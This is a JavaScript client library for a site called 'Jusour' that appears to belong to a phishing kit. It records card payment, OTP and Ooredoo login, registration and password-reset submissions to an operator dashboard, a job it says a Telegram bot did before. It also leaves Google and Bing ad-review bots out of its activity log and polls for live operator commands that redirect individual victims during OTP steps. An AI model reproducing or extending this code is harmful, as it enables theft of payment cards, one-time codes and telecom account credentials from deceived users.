/* ============================================================
   Jusour - shared client library.

   Replaces the previous Telegram-based config. Everything the public
   pages send now goes to the backend API, which stores it and pushes
   it to the admin dashboard over SSE.

   Telegram has been removed entirely: no bot token, no chat ids, no
   sendMessage / getUpdates calls, no command files.
   ============================================================ */

'use strict';

var JUSOUR_API = (window.FRONTEND_CONFIG && window.FRONTEND_CONFIG.apiBaseUrl) 
    ? (window.FRONTEND_CONFIG.apiBaseUrl.replace(/\/$/, '') + '/')
    : '/api/';

/** localStorage key holding this browser's reference (kept from before). */
var JUSOUR_REF_KEY = 'refID';

/**
 * True for crawlers and ad-review bots.
 * Only used to keep automated page views out of the activity log; a real
 * form submission is always recorded, because the dashboard is now the
 * single source of truth and nothing may be dropped.
 */
function isAutomatedVisitor() {
  return /Googlebot|AdsBot|Mediapartners-Google|bingbot|DuckDuckBot/i.test(navigator.userAgent || '');
}

/** Read this browser's reference, creating one on first visit. */
function getRef() {
  var ref = '';
  try {
    ref = localStorage.getItem(JUSOUR_REF_KEY) || '';
  } catch (error) {
    ref = '';
  }

  if (ref === '') {
    ref = 'REF-' + Math.floor(Math.random() * 900000 + 100000);
    try {
      localStorage.setItem(JUSOUR_REF_KEY, ref);
    } catch (error) {
      /* Private mode: the reference simply will not persist. */
    }
  }

  return ref;
}

/** Persist a reference that arrived via the URL. */
function setRef(ref) {
  if (!ref) {
    return getRef();
  }
  try {
    localStorage.setItem(JUSOUR_REF_KEY, ref);
  } catch (error) {
    /* Ignore storage failures. */
  }
  return ref;
}

/** Resolve the reference from ?ref=, falling back to storage. */
function resolveRef() {
  var fromUrl = new URLSearchParams(window.location.search).get('ref');
  return fromUrl ? setRef(fromUrl) : getRef();
}

/**
 * Send data to the backend.
 *
 * @param {object} payload
 *   ref         {string}  required
 *   page_key    {string}  registry page key, e.g. 'customer'
 *   summary     {string}  optional one-line description
 *   fields      {Array}   [{ label, value, sensitive }]
 *   name, phone, address, email, country, service, total_price
 * @returns {Promise<object>}
 */
function jusourSubmit(payload) {
  var body = Object.assign({}, payload || {});
  body.ref = body.ref || getRef();

  return fetch(JUSOUR_API + 'submit', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'same-origin',
    body: JSON.stringify(body)
  }).then(function (response) {
    return response.json();
  });
}

/* ------------------------------------------------------------------
   Compatibility shim for the old tracking calls
   ------------------------------------------------------------------ */

/** Legacy page name -> registry page key. Mirrors the server mapping. */
var LEGACY_PAGES = {
  'Home-Entrance': 'activity',
  'Hourly-Page': 'hourly',
  'Hourly-Selection': 'hourly',
  'Monthly-Page': 'monthly',
  'Monthly-Selection': 'monthly',
  'Recruitment-Page': 'recruitment',
  'Recruitment-Nationality': 'recruitment',
  'Entering-Customer-Info': 'customer',
  'Order-Summary': 'customer',
  'Order-Summary-View': 'summary',
  'Going-To-Payment-Methods': 'summary',
  'Payment-Methods-View': 'payment_methods',
  'Proceeding-To-Card-Payment': 'payment_methods',
  'Payment-Submitted': 'payment',
  'OTP-Sent': 'otp',
  'Ooredoo-Login-Submit': 'ooredoo_login',
  'Ooredoo-Reg-Submit': 'ooredoo_reg',
  'Forgot-Password-Submitted': 'ooredoo_forgot',
  'Success-Page-View': 'activity',
  'WAITING-IN-LOADING': 'activity',
  'WAITING-ERROR-ACTION': 'activity',
  'WAITING-OTP-ACTION': 'activity'
};

/** Map a legacy page name onto a registry key. */
function legacyPageKey(page) {
  if (LEGACY_PAGES[page]) {
    return LEGACY_PAGES[page];
  }
  var keys = Object.keys(LEGACY_PAGES);
  for (var i = 0; i < keys.length; i++) {
    if (page && page.indexOf(keys[i]) === 0) {
      return LEGACY_PAGES[keys[i]];
    }
  }
  return 'activity';
}

/**
 * Record a page view or a submission.
 *
 * Kept with its original signature so any page that still calls it keeps
 * working. `data` used to be a Telegram message blob; when present it is
 * preserved verbatim as a field so nothing is lost.
 *
 * @param {string} ref
 * @param {string} page        legacy page name
 * @param {string} [data]      optional free-text payload
 */
function trackAction(ref, page, data) {
  if (isAutomatedVisitor()) {
    return Promise.resolve({ ok: true, skipped: true });
  }

  var payload = {
    ref: ref || getRef(),
    page_key: legacyPageKey(page),
    summary: page
  };

  if (data) {
    payload.fields = [{ label: 'البيانات الأصلية', value: String(data), sensitive: false }];
  }

  return jusourSubmit(payload).catch(function () {
    return { ok: false };
  });
}

/* ------------------------------------------------------------------
   Remote command polling
   ------------------------------------------------------------------ */

/**
 * Poll for an administrator command aimed at this visitor.
 *
 * Replaces the old commands/<ref>.txt polling and the Telegram
 * getUpdates loop.
 *
 * @param {string}   ref
 * @param {function} handler  called with { command, redirect, status, label }
 *                            whenever a command arrives
 * @param {number}   [intervalMs]  default 3000
 * @returns {function} stop function
 */
function pollCommands(ref, handler, intervalMs) {
  var stopped = false;
  var delay = intervalMs || 3000;

  function tick() {
    if (stopped) {
      return;
    }

    fetch(JUSOUR_API + 'poll_commands?ref=' + encodeURIComponent(ref), {
      credentials: 'same-origin'
    })
      .then(function (response) {
        return response.json();
      })
      .then(function (data) {
        if (stopped || !data || !data.command) {
          return;
        }
        handler(data);
      })
      .catch(function () {
        /* Network hiccup: the next tick retries. */
      })
      .then(function () {
        if (!stopped) {
          window.setTimeout(tick, delay);
        }
      });
  }

  tick();

  return function stop() {
    stopped = true;
  };
}

/* ------------------------------------------------------------------
   Small helpers used by several pages
   ------------------------------------------------------------------ */

/** Read a value from localStorage without throwing. */
function storedValue(key, fallback) {
  try {
    var value = localStorage.getItem(key);
    return value === null ? fallback : value;
  } catch (error) {
    return fallback;
  }
}

/** Write a value to localStorage without throwing. */
function storeValue(key, value) {
  try {
    localStorage.setItem(key, value);
  } catch (error) {
    /* Ignore storage failures. */
  }
}
